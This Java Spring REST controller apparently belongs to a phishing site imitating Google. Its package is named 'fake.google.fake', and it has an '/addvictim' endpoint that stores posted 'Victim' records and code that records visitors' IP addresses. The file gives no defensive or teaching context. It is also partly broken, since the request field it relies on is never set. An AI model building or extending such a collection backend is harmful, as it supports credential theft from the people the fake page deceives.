package fake.google.fake.controller;

import fake.google.fake.model.Victim;
import fake.google.fake.service.VictimService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

//@CrossOrigin(origins = "http://localhost:8080")
@org.springframework.web.bind.annotation.RestController
@RequestMapping("api")
public class RestController {
    private final VictimService victimService;

    private static HttpServletRequest request;

    public void setRequest(HttpServletRequest request) {
        this.request = request;
    }

    public RestController(VictimService victimService) {
        this.victimService = victimService;
    }

    @PostMapping("/addvictim")
    public ResponseEntity save(@RequestBody Victim victim){
        return ResponseEntity.ok(victimService.save(victim));
    }


    private static String getClientIp() {

        String remoteAddr = "";

        if (request != null) {
            remoteAddr = request.getHeader("X-FORWARDED-FOR");
            if (remoteAddr == null || "".equals(remoteAddr)) {
                remoteAddr = request.getRemoteAddr();
            }
        }

        return remoteAddr;
    }

    @GetMapping("web")
    public ResponseEntity trans(){
//        System.out.println(request.getRemoteAddr());
        return ResponseEntity.ok(request.getRemoteAddr());
    }

}
